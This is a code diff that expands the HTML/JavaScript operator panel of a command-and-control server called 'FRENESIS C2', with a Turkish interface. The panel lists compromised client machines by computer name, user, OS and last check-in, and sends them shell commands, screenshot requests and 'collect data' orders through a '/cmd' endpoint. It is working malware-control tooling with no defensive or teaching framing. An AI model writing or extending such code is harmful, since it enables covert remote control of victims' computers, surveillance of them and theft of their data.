@@ -1,11 +1,141 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FRENESIS C2</title>
-    <style>body{background:#111;color:#0f0;font-family:Arial;padding:20px;}</style>
+    <title>FRENESIS C2 Kontrol Paneli</title>
+    <style>
+        body { font-family: Arial; background: #111; color: #0f0; margin: 20px; }
+        .client { border: 1px solid #0f0; padding: 15px; margin: 10px 0; background: #222; }
+        button { background: #0f0; color: #000; border: none; padding: 8px 15px; margin: 5px; cursor: pointer; font-weight: bold; }
+        button:hover { background: #0c0; }
+        h1 { color: #0f0; }
+        #clients { margin: 20px 0; }
+        .online { color: #0f0; }
+        .offline { color: #f00; }
+    </style>
 </head>
 <body>
     <h1>🖥️ FRENESIS C2 Kontrol Paneli</h1>
-    <p>İstemciler burada listelenecek...</p>
+    
+    <div id="clients">
+        <p>İstemciler yükleniyor...</p>
+    </div>
+    
+    <div id="commandPanel" style="display:none;">
+        <h2>Komut Gönder</h2>
+        <div>
+            <label>İstemci: </label>
+            <select id="clientSelect"></select>
+        </div>
+        <div>
+            <label>Komut Türü: </label>
+            <select id="commandType">
+                <option value="shell">Shell Komutu</option>
+                <option value="screenshot">Ekran Görüntüsü</option>
+                <option value="collect">Veri Topla</option>
+            </select>
+        </div>
+        <div>
+            <label>Komut: </label>
+            <input type="text" id="commandInput" placeholder="whoami / ipconfig / dir...">
+        </div>
+        <button onclick="sendCommand()">Komut Gönder</button>
+    </div>
+
+    <script>
+        // İstemcileri yükle
+        async function loadClients() {
+            try {
+                const response = await fetch('/api/clients');
+                const clients = await response.json();
+                
+                let html = '<h2>📡 Bağlı İstemciler (' + Object.keys(clients).length + ')</h2>';
+                
+                if (Object.keys(clients).length === 0) {
+                    html += '<p>Henüz istemci bağlanmadı.</p>';
+                } else {
+                    // İstemci seçimi için dropdown'u doldur
+                    const select = document.getElementById('clientSelect');
+                    select.innerHTML = '';
+                    
+                    for (const clientId in clients) {
+                        const client = clients[clientId];
+                        const lastSeen = new Date(client.last_seen);
+                        const now = new Date();
+                        const minutesAgo = Math.floor((now - lastSeen) / (1000 * 60));
+                        const status = minutesAgo < 5 ? '🟢 Çevrimiçi' : '🟡 Uykuda';
+                        
+                        // İstemci kartı
+                        html += `
+                        <div class="client">
+                            <strong>${client.computer_name || 'Bilinmeyen'}</strong><br>
+                            <strong>Kullanıcı:</strong> ${client.user || 'Bilinmeyen'}<br>
+                            <strong>OS:</strong> ${client.os || 'Bilinmeyen'}<br>
+                            <strong>Son Görülme:</strong> ${client.last_seen}<br>
+                            <strong>Durum:</strong> ${status} (${minutesAgo} dakika önce)<br>
+                            <button onclick="sendSpecificCommand('${clientId}', 'collect')">📊 Veri Topla</button>
+                            <button onclick="sendSpecificCommand('${clientId}', 'screenshot')">📸 Ekran Görüntüsü</button>
+                            <button onclick="sendSpecificCommand('${clientId}', 'shell', 'whoami')">🖥️ whoami</button>
+                            <button onclick="sendSpecificCommand('${clientId}', 'shell', 'ipconfig')">🌐 ipconfig</button>
+                        </div>`;
+                        
+                        // Dropdown'a ekle
+                        const option = document.createElement('option');
+                        option.value = clientId;
+                        option.text = `${client.computer_name} (${client.user})`;
+                        select.appendChild(option);
+                    }
+                    
+                    // Komut panelini göster
+                    document.getElementById('commandPanel').style.display = 'block';
+                }
+                
+                document.getElementById('clients').innerHTML = html;
+            } catch (error) {
+                document.getElementById('clients').innerHTML = '<p style="color:red">Sunucuya bağlanılamadı. Sunucu çalışıyor mu?</p>';
+                console.error('Hata:', error);
+            }
+        }
+        
+        // Komut gönder
+        async function sendSpecificCommand(clientId, type, data = '') {
+            try {
+                const response = await fetch('/cmd', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        client_id: clientId,
+                        command: {type: type, data: data}
+                    })
+                });
+                
+                const result = await response.json();
+                alert(`✅ Komut gönderildi!\nKomut ID: ${result.command_id || 'N/A'}\nDurum: ${result.status}`);
+                
+                // 5 saniye sonra verileri yenile
+                setTimeout(loadClients, 5000);
+            } catch (error) {
+                alert('❌ Komut gönderilemedi: ' + error);
+            }
+        }
+        
+        function sendCommand() {
+            const clientId = document.getElementById('clientSelect').value;
+            const type = document.getElementById('commandType').value;
+            const data = document.getElementById('commandInput').value;
+            
+            if (!clientId) {
+                alert('Lütfen bir istemci seçin!');
+                return;
+            }
+            
+            sendSpecificCommand(clientId, type, data);
+        }
+        
+        // Her 10 saniyede bir yenile
+        setInterval(loadClients, 10000);
+        
+        // Sayfa yüklendiğinde çalıştır
+        document.addEventListener('DOMContentLoaded', loadClients);
+    </script>
 </body>
 </html>
